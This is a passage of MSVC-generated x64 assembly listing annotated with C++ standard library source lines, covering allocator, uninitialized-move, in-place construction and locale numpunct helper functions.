	call	??$_Voidify_iter@PEAE@std@@YAPEAXPEAE@Z	; std::_Voidify_iter<unsigned char *>
	mov	rdx, rax
	mov	ecx, 1
	call	??2@YAPEAX_KPEAX@Z			; operator new
	mov	QWORD PTR $T1[rsp], rax
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	call	??$forward@AEBE@std@@YAAEBEAEBE@Z	; std::forward<unsigned char const &>
	mov	rcx, QWORD PTR $T1[rsp]
	movzx	eax, BYTE PTR [rax]
	mov	BYTE PTR [rcx], al

; 239  :     }
; 240  : }

	add	rsp, 56					; 00000038H
	ret	0
??$_Construct_in_place@EAEBE@std@@YAXAEAEAEBE@Z ENDP	; std::_Construct_in_place<unsigned char,unsigned char const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z
_TEXT	SEGMENT
_UFirst$ = 32
_ULast$ = 40
$T1 = 48
_Backout$ = 56
_First$ = 96
_Last$ = 104
_Dest$ = 112
_Al$ = 120
??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z PROC ; std::_Uninitialized_move<wchar_t *,std::allocator<wchar_t> >, COMDAT

; 1740 :     const _InIt _First, const _InIt _Last, _Alloc_ptr_t<_Alloc> _Dest, _Alloc& _Al) {

$LN7:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H

; 1741 :     // move [_First, _Last) to raw _Dest, using _Al
; 1742 :     // note: only called internally from elsewhere in the STL
; 1743 :     using _Ptrval     = typename _Alloc::value_type*;
; 1744 :     auto _UFirst      = _Get_unwrapped(_First);

	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_Get_unwrapped@AEBQEA_W@std@@YA?A_TAEBQEA_W@Z ; std::_Get_unwrapped<wchar_t * const &>
	mov	QWORD PTR _UFirst$[rsp], rax

; 1745 :     const auto _ULast = _Get_unwrapped(_Last);

	lea	rcx, QWORD PTR _Last$[rsp]
	call	??$_Get_unwrapped@AEBQEA_W@std@@YA?A_TAEBQEA_W@Z ; std::_Get_unwrapped<wchar_t * const &>
	mov	QWORD PTR _ULast$[rsp], rax

; 1746 :     if constexpr (conjunction_v<bool_constant<_Iter_move_cat<decltype(_UFirst), _Ptrval>::_Bitcopy_constructible>,
; 1747 :                       _Uses_default_construct<_Alloc, _Ptrval, decltype(_STD move(*_UFirst))>>) {
; 1748 : #if _HAS_CXX20
; 1749 :         if (!_STD is_constant_evaluated())
; 1750 : #endif // _HAS_CXX20
; 1751 :         {
; 1752 :             _Copy_memmove(_UFirst, _ULast, _Unfancy(_Dest));

	mov	rcx, QWORD PTR _Dest$[rsp]
	call	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z	; std::_Unfancy<wchar_t>
	mov	r8, rax
	mov	rdx, QWORD PTR _ULast$[rsp]
	mov	rcx, QWORD PTR _UFirst$[rsp]
	call	??$_Copy_memmove@PEA_WPEA_W@std@@YAPEA_WPEA_W00@Z ; std::_Copy_memmove<wchar_t *,wchar_t *>

; 1753 :             return _Dest + (_ULast - _UFirst);

	mov	rax, QWORD PTR _UFirst$[rsp]
	mov	rcx, QWORD PTR _ULast$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	sar	rax, 1
	mov	rcx, QWORD PTR _Dest$[rsp]
	lea	rax, QWORD PTR [rcx+rax*2]
	jmp	SHORT $LN1@Uninitiali

; 1754 :         }
; 1755 :     }
; 1756 : 
; 1757 :     _Uninitialized_backout_al<_Alloc> _Backout{_Dest, _Al};

	mov	r8, QWORD PTR _Al$[rsp]
	mov	rdx, QWORD PTR _Dest$[rsp]
	lea	rcx, QWORD PTR _Backout$[rsp]
	call	??0?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@PEA_WAEAV?$allocator@_W@1@@Z ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Uninitialized_backout_al<std::allocator<wchar_t> >

; 1758 :     for (; _UFirst != _ULast; ++_UFirst) {

	jmp	SHORT $LN4@Uninitiali
$LN2@Uninitiali:
	mov	rax, QWORD PTR _UFirst$[rsp]
	add	rax, 2
	mov	QWORD PTR _UFirst$[rsp], rax
$LN4@Uninitiali:
	mov	rax, QWORD PTR _ULast$[rsp]
	cmp	QWORD PTR _UFirst$[rsp], rax
	je	SHORT $LN3@Uninitiali

; 1759 :         _Backout._Emplace_back(_STD move(*_UFirst));

	mov	rcx, QWORD PTR _UFirst$[rsp]
	call	??$move@AEA_W@std@@YA$$QEA_WAEA_W@Z	; std::move<wchar_t &>
	mov	rdx, rax
	lea	rcx, QWORD PTR _Backout$[rsp]
	call	??$_Emplace_back@_W@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAX$$QEA_W@Z ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Emplace_back<wchar_t>

; 1760 :     }

	jmp	SHORT $LN2@Uninitiali
$LN3@Uninitiali:

; 1761 : 
; 1762 :     return _Backout._Release();

	lea	rcx, QWORD PTR _Backout$[rsp]
	call	?_Release@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAPEA_WXZ ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Release
	mov	QWORD PTR $T1[rsp], rax
	lea	rcx, QWORD PTR _Backout$[rsp]
	call	??1?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@XZ ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::~_Uninitialized_backout_al<std::allocator<wchar_t> >
	mov	rax, QWORD PTR $T1[rsp]
$LN1@Uninitiali:

; 1763 : }

	add	rsp, 88					; 00000058H
	ret	0
??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z ENDP ; std::_Uninitialized_move<wchar_t *,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_UFirst$ = 32
_ULast$ = 40
$T1 = 48
_Backout$ = 56
_First$ = 96
_Last$ = 104
_Dest$ = 112
_Al$ = 120
?dtor$0@?0???$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z@4HA PROC ; `std::_Uninitialized_move<wchar_t *,std::allocator<wchar_t> >'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Backout$[rbp]
	call	??1?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@XZ ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::~_Uninitialized_backout_al<std::allocator<wchar_t> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z@4HA ENDP ; `std::_Uninitialized_move<wchar_t *,std::allocator<wchar_t> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$construct@_WAEB_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_WAEB_W@Z
_TEXT	SEGMENT
$T1 = 32
__formal$ = 64
_Ptr$ = 72
<_Args_0>$ = 80
??$construct@_WAEB_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_WAEB_W@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::construct<wchar_t,wchar_t const &>, COMDAT

; 675  :     static _CONSTEXPR20 void construct(_Alloc&, _Objty* const _Ptr, _Types&&... _Args) {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 676  : #if _HAS_CXX20
; 677  :         if (_STD is_constant_evaluated()) {
; 678  :             _STD construct_at(_Ptr, _STD forward<_Types>(_Args)...);
; 679  :         } else
; 680  : #endif // _HAS_CXX20
; 681  :         {
; 682  :             ::new (_Voidify_iter(_Ptr)) _Objty(_STD forward<_Types>(_Args)...);

	mov	rcx, QWORD PTR _Ptr$[rsp]
	call	??$_Voidify_iter@PEA_W@std@@YAPEAXPEA_W@Z ; std::_Voidify_iter<wchar_t *>
	mov	rdx, rax
	mov	ecx, 2
	call	??2@YAPEAX_KPEAX@Z			; operator new
	mov	QWORD PTR $T1[rsp], rax
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	call	??$forward@AEB_W@std@@YAAEB_WAEB_W@Z	; std::forward<wchar_t const &>
	mov	rcx, QWORD PTR $T1[rsp]
	movzx	eax, WORD PTR [rax]
	mov	WORD PTR [rcx], ax

; 683  :         }
; 684  :     }

	add	rsp, 56					; 00000038H
	ret	0
??$construct@_WAEB_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_WAEB_W@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::construct<wchar_t,wchar_t const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Construct_in_place@_WAEB_W@std@@YAXAEA_WAEB_W@Z
_TEXT	SEGMENT
$T1 = 32
_Obj$ = 64
<_Args_0>$ = 72
??$_Construct_in_place@_WAEB_W@std@@YAXAEA_WAEB_W@Z PROC ; std::_Construct_in_place<wchar_t,wchar_t const &>, COMDAT

; 231  :     is_nothrow_constructible_v<_Ty, _Types...>) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 232  : #if _HAS_CXX20
; 233  :     if (_STD is_constant_evaluated()) {
; 234  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 235  :     } else
; 236  : #endif // _HAS_CXX20
; 237  :     {
; 238  :         ::new (_Voidify_iter(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

	mov	rcx, QWORD PTR _Obj$[rsp]
	call	??$addressof@_W@std@@YAPEA_WAEA_W@Z	; std::addressof<wchar_t>
	mov	rcx, rax
	call	??$_Voidify_iter@PEA_W@std@@YAPEAXPEA_W@Z ; std::_Voidify_iter<wchar_t *>
	mov	rdx, rax
	mov	ecx, 2
	call	??2@YAPEAX_KPEAX@Z			; operator new
	mov	QWORD PTR $T1[rsp], rax
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	call	??$forward@AEB_W@std@@YAAEB_WAEB_W@Z	; std::forward<wchar_t const &>
	mov	rcx, QWORD PTR $T1[rsp]
	movzx	eax, WORD PTR [rax]
	mov	WORD PTR [rcx], ax

; 239  :     }
; 240  : }

	add	rsp, 56					; 00000038H
	ret	0
??$_Construct_in_place@_WAEB_W@std@@YAXAEA_WAEB_W@Z ENDP ; std::_Construct_in_place<wchar_t,wchar_t const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$forward@AEBV?$allocator@_W@std@@@std@@YAAEBV?$allocator@_W@0@AEBV10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEBV?$allocator@_W@std@@@std@@YAAEBV?$allocator@_W@0@AEBV10@@Z PROC ; std::forward<std::allocator<wchar_t> const &>, COMDAT

; 1411 :     remove_reference_t<_Ty>& _Arg) noexcept { // forward an lvalue as either an lvalue or an rvalue

	mov	QWORD PTR [rsp+8], rcx

; 1412 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1413 : }

	ret	0
??$forward@AEBV?$allocator@_W@std@@@std@@YAAEBV?$allocator@_W@0@AEBV10@@Z ENDP ; std::forward<std::allocator<wchar_t> const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$?0AEAPEAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PEAV_Facet_base@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@AEAPEAV_Facet_base@1@@Z
_TEXT	SEGMENT
this$ = 48
__formal$ = 56
<_Val2_0>$ = 64
??$?0AEAPEAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PEAV_Facet_base@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@AEAPEAV_Facet_base@1@@Z PROC ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1><std::_Facet_base * &>, COMDAT

; 1375 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR <_Val2_0>$[rsp]
	call	??$forward@AEAPEAV_Facet_base@std@@@std@@YAAEAPEAV_Facet_base@0@AEAPEAV10@@Z ; std::forward<std::_Facet_base * &>
	mov	rcx, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR [rcx], rax
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??$?0AEAPEAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PEAV_Facet_base@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@AEAPEAV_Facet_base@1@@Z ENDP ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1><std::_Facet_base * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ??__E?id@?$numpunct@D@std@@2V0locale@2@A@@YAXXZ
text$di	SEGMENT
??__E?id@?$numpunct@D@std@@2V0locale@2@A@@YAXXZ PROC	; `dynamic initializer for 'std::numpunct<char>::id'', COMDAT

; 252  : __PURE_APPDOMAIN_GLOBAL locale::id numpunct<_Elem>::id;

	sub	rsp, 40					; 00000028H
	xor	edx, edx
	lea	rcx, OFFSET FLAT:?id@?$numpunct@D@std@@2V0locale@2@A ; std::numpunct<char>::id
	call	??0id@locale@std@@QEAA@_K@Z		; std::locale::id::id
	add	rsp, 40					; 00000028H
	ret	0
??__E?id@?$numpunct@D@std@@2V0locale@2@A@@YAXXZ ENDP	; `dynamic initializer for 'std::numpunct<char>::id''
text$di	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ??__E?id@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@2V0locale@2@A@@YAXXZ
text$di	SEGMENT
??__E?id@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@2V0locale@2@A@@YAXXZ PROC ; `dynamic initializer for 'std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::id'', COMDAT

; 1592 : __PURE_APPDOMAIN_GLOBAL locale::id num_put<_Elem, _OutIt>::id;

	sub	rsp, 40					; 00000028H
	xor	edx, edx
	lea	rcx, OFFSET FLAT:?id@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@2V0locale@2@A ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::id
	call	??0id@locale@std@@QEAA@_K@Z		; std::locale::id::id
	add	rsp, 40					; 00000028H
	ret	0
??__E?id@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@2V0locale@2@A@@YAXXZ ENDP ; `dynamic initializer for 'std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::id''
text$di	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ??$_Getvals@D@?$numpunct@D@std@@IEAAXDPEBUlconv@@U_Cvtvec@@@Z
_TEXT	SEGMENT
this$ = 48
__formal$ = 56
_Ptr$ = 64
_Cvt$ = 72
??$_Getvals@D@?$numpunct@D@std@@IEAAXDPEBUlconv@@U_Cvtvec@@@Z PROC ; std::numpunct<char>::_Getvals<char>, COMDAT

; 163  :     void _Getvals(_Elem2, const lconv* _Ptr, _Locinfo::_Cvtvec _Cvt) { // get values

$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 164  :         _Dp         = _Maklocchr(_Ptr->decimal_point[0], static_cast<_Elem2*>(nullptr), _Cvt);

	mov	eax, 1
	imul	rax, rax, 0
	mov	rcx, QWORD PTR _Ptr$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	r8, QWORD PTR _Cvt$[rsp]
	xor	edx, edx
	movzx	ecx, BYTE PTR [rcx+rax]
	call	??$_Maklocchr@D@std@@YADDPEADAEBU_Cvtvec@@@Z ; std::_Maklocchr<char>
	mov	rcx, QWORD PTR this$[rsp]
	mov	BYTE PTR [rcx+24], al

; 165  :         _Kseparator = _Maklocchr(_Ptr->thousands_sep[0], static_cast<_Elem2*>(nullptr), _Cvt);

	mov	eax, 1
	imul	rax, rax, 0
	mov	rcx, QWORD PTR _Ptr$[rsp]
	mov	rcx, QWORD PTR [rcx+8]
	mov	r8, QWORD PTR _Cvt$[rsp]
	xor	edx, edx
	movzx	ecx, BYTE PTR [rcx+rax]
	call	??$_Maklocchr@D@std@@YADDPEADAEBU_Cvtvec@@@Z ; std::_Maklocchr<char>
	mov	rcx, QWORD PTR this$[rsp]
	mov	BYTE PTR [rcx+25], al

; 166  :     }

	add	rsp, 40					; 00000028H
	ret	0
??$_Getvals@D@?$numpunct@D@std@@IEAAXDPEBUlconv@@U_Cvtvec@@@Z ENDP ; std::numpunct<char>::_Getvals<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??$_Maklocchr@D@std@@YADDPEADAEBU_Cvtvec@@@Z
_TEXT	SEGMENT
_Byte$ = 8
__formal$ = 16
__formal$ = 24
??$_Maklocchr@D@std@@YADDPEADAEBU_Cvtvec@@@Z PROC	; std::_Maklocchr<char>, COMDAT

; 487  : _Elem __CRTDECL _Maklocchr(char _Byte, _Elem*, const _Locinfo::_Cvtvec&) {

	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	BYTE PTR [rsp+8], cl

; 488  :     // convert char to _Elem using _Cvtvec
; 489  :     return static_cast<_Elem>(static_cast<unsigned char>(_Byte));

	movzx	eax, BYTE PTR _Byte$[rsp]

; 490  : }

	ret	0
??$_Maklocchr@D@std@@YADDPEADAEBU_Cvtvec@@@Z ENDP	; std::_Maklocchr<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??$_Maklocstr@D@std@@YAPEADPEBDPEADAEBU_Cvtvec@@@Z
_TEXT	SEGMENT
_Count$ = 32
_Ptrnext$1 = 40
_Ptrdest$ = 48
_Ptr$ = 80
__formal$ = 88
__formal$ = 96
??$_Maklocstr@D@std@@YAPEADPEBDPEADAEBU_Cvtvec@@@Z PROC	; std::_Maklocstr<char>, COMDAT

; 513  : _Elem* __CRTDECL _Maklocstr(const char* _Ptr, _Elem*, const _Locinfo::_Cvtvec&) {

$LN7:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 514  :     // convert C string to _Elem sequence using _Cvtvec
; 515  :     size_t _Count = _CSTD strlen(_Ptr) + 1;

	mov	rcx, QWORD PTR _Ptr$[rsp]
	call	strlen
	inc	rax
	mov	QWORD PTR _Count$[rsp], rax

; 516  : 
; 517  :     _Elem* _Ptrdest = static_cast<_Elem*>(_calloc_dbg(_Count, sizeof(_Elem), _CRT_BLOCK, __FILE__, __LINE__));

	mov	edx, 1
	mov	rcx, QWORD PTR _Count$[rsp]
	call	calloc
	mov	QWORD PTR _Ptrdest$[rsp], rax

; 518  : 
; 519  :     if (!_Ptrdest) {

	cmp	QWORD PTR _Ptrdest$[rsp], 0
	jne	SHORT $LN5@Maklocstr

; 520  :         _Xbad_alloc();

	call	?_Xbad_alloc@std@@YAXXZ			; std::_Xbad_alloc
$LN5@Maklocstr:

; 521  :     }
; 522  : 
; 523  :     for (_Elem* _Ptrnext = _Ptrdest; 0 < _Count; --_Count, ++_Ptrnext, ++_Ptr) {

	mov	rax, QWORD PTR _Ptrdest$[rsp]
	mov	QWORD PTR _Ptrnext$1[rsp], rax
	jmp	SHORT $LN4@Maklocstr
$LN2@Maklocstr:
	mov	rax, QWORD PTR _Count$[rsp]
	dec	rax
	mov	QWORD PTR _Count$[rsp], rax
	mov	rax, QWORD PTR _Ptrnext$1[rsp]
	inc	rax
	mov	QWORD PTR _Ptrnext$1[rsp], rax
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax
$LN4@Maklocstr:
	cmp	QWORD PTR _Count$[rsp], 0
	jbe	SHORT $LN3@Maklocstr

; 524  :         *_Ptrnext = static_cast<_Elem>(static_cast<unsigned char>(*_Ptr));

	mov	rax, QWORD PTR _Ptrnext$1[rsp]
	mov	rcx, QWORD PTR _Ptr$[rsp]
	movzx	ecx, BYTE PTR [rcx]
	mov	BYTE PTR [rax], cl

; 525  :     }

	jmp	SHORT $LN2@Maklocstr
$LN3@Maklocstr:

; 526  : 
; 527  :     return _Ptrdest;

	mov	rax, QWORD PTR _Ptrdest$[rsp]
$LN6@Maklocstr:

; 528  : }

	add	rsp, 72					; 00000048H
	ret	0
??$_Maklocstr@D@std@@YAPEADPEBDPEADAEBU_Cvtvec@@@Z ENDP	; std::_Maklocstr<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??1?$_Tidy_guard@V?$numpunct@D@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$_Tidy_guard@V?$numpunct@D@std@@@std@@QEAA@XZ PROC	; std::_Tidy_guard<std::numpunct<char> >::~_Tidy_guard<std::numpunct<char> >, COMDAT

; 33   :     _CONSTEXPR20 ~_Tidy_guard() {

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 34   :         if (_Target) {

	mov	rax, QWORD PTR this$[rsp]
	cmp	QWORD PTR [rax], 0
	je	SHORT $LN2@Tidy_guard

; 35   :             _Target->_Tidy();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	?_Tidy@?$numpunct@D@std@@AEAAXXZ	; std::numpunct<char>::_Tidy
$LN2@Tidy_guard:

; 36   :         }
; 37   :     }

	add	rsp, 40					; 00000028H
	ret	0
??1?$_Tidy_guard@V?$numpunct@D@std@@@std@@QEAA@XZ ENDP	; std::_Tidy_guard<std::numpunct<char> >::~_Tidy_guard<std::numpunct<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Get_size_of_n@$00@std@@YA_K_K@Z
_TEXT	SEGMENT
_Overflow_is_possible$ = 0
_Count$ = 32
??$_Get_size_of_n@$00@std@@YA_K_K@Z PROC		; std::_Get_size_of_n<1>, COMDAT

; 55   : _NODISCARD constexpr size_t _Get_size_of_n(const size_t _Count) {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 56   :     constexpr bool _Overflow_is_possible = _Ty_size > 1;

	mov	BYTE PTR _Overflow_is_possible$[rsp], 0

; 57   : 
; 58   :     if constexpr (_Overflow_is_possible) {
; 59   :         constexpr size_t _Max_possible = static_cast<size_t>(-1) / _Ty_size;
; 60   :         if (_Count > _Max_possible) {
; 61   :             _Throw_bad_array_new_length(); // multiply overflow
; 62   :         }
; 63   :     }
; 64   : 
; 65   :     return _Count * _Ty_size;

	mov	rax, QWORD PTR _Count$[rsp]

; 66   : }

	add	rsp, 24
	ret	0
??$_Get_size_of_n@$00@std@@YA_K_K@Z ENDP		; std::_Get_size_of_n<1>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Get_size_of_n@$01@std@@YA_K_K@Z
_TEXT	SEGMENT
_Overflow_is_possible$ = 32
_Max_possible$1 = 40
_Count$ = 64
??$_Get_size_of_n@$01@std@@YA_K_K@Z PROC		; std::_Get_size_of_n<2>, COMDAT

; 55   : _NODISCARD constexpr size_t _Get_size_of_n(const size_t _Count) {

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 56   :     constexpr bool _Overflow_is_possible = _Ty_size > 1;

	mov	BYTE PTR _Overflow_is_possible$[rsp], 1

; 57   : 
; 58   :     if constexpr (_Overflow_is_possible) {
; 59   :         constexpr size_t _Max_possible = static_cast<size_t>(-1) / _Ty_size;

	mov	rax, 9223372036854775807		; 7fffffffffffffffH
	mov	QWORD PTR _Max_possible$1[rsp], rax

; 60   :         if (_Count > _Max_possible) {

	mov	rax, 9223372036854775807		; 7fffffffffffffffH
	cmp	QWORD PTR _Count$[rsp], rax
	jbe	SHORT $LN2@Get_size_o

; 61   :             _Throw_bad_array_new_length(); // multiply overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
$LN2@Get_size_o:

; 62   :         }
; 63   :     }
; 64   : 
; 65   :     return _Count * _Ty_size;

	mov	rax, QWORD PTR _Count$[rsp]
	shl	rax, 1
$LN3@Get_size_o:

; 66   : }

	add	rsp, 56					; 00000038H
	ret	0
??$_Get_size_of_n@$01@std@@YA_K_K@Z ENDP		; std::_Get_size_of_n<2>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z
_TEXT	SEGMENT
_Bytes$ = 48
??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z PROC ; std::_Allocate<16,std::_Default_allocate_traits,0>, COMDAT

; 223  : __declspec(allocator) _CONSTEXPR20 void* _Allocate(const size_t _Bytes) {

$LN5:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 224  :     // allocate _Bytes when !_HAS_ALIGNED_NEW || _Align <= __STDCPP_DEFAULT_NEW_ALIGNMENT__
; 225  : #if defined(_M_IX86) || defined(_M_X64)
; 226  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 227  :     if (!_STD is_constant_evaluated())
; 228  : #endif // _HAS_CXX20
; 229  :     {
; 230  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

	cmp	QWORD PTR _Bytes$[rsp], 4096		; 00001000H
	jb	SHORT $LN2@Allocate

; 231  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	mov	rcx, QWORD PTR _Bytes$[rsp]
	call	??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
	jmp	SHORT $LN1@Allocate
$LN2@Allocate:

; 232  :         }
; 233  :     }
; 234  : #endif // defined(_M_IX86) || defined(_M_X64)
; 235  : 
; 236  :     if (_Bytes != 0) {

	cmp	QWORD PTR _Bytes$[rsp], 0
	je	SHORT $LN3@Allocate

; 237  :         return _Traits::_Allocate(_Bytes);

	mov	rcx, QWORD PTR _Bytes$[rsp]
	call	?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
	jmp	SHORT $LN1@Allocate
$LN3@Allocate:

; 238  :     }
; 239  : 
; 240  :     return nullptr;

	xor	eax, eax
$LN1@Allocate:

; 241  : }

	add	rsp, 40					; 00000028H
	ret	0
??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ENDP ; std::_Allocate<16,std::_Default_allocate_traits,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\utility
